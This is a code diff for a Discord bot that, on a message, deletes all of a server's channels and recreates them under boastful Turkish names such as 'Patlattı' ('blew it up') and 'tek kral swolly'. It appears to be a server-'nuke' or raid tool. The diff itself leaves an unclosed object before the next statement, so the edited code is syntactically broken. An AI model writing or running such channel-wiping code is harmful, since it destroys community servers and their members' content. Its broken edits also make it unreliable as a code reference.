@@ -145,10 +145,9 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();
 
-    await msg.guild.createChannel("✝-tek-kral-swolly"); 
-    
-    await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+    await msg.guild.createChannel("✝-tek-kral-swolly", {
+          type: "text"
+    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
@@ -156,7 +155,7 @@ client.on("message", async msg => {
       });
     await msg.guild
       .createChannel("✝ Swolly", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
@@ -170,7 +169,7 @@ client.on("message", async msg => {
       });   
     await msg.guild
       .createChannel("✝ Patlattı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
@@ -184,7 +183,7 @@ client.on("message", async msg => {
       });
     await msg.guild
       .createChannel("✝ Kimse Yenemez", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
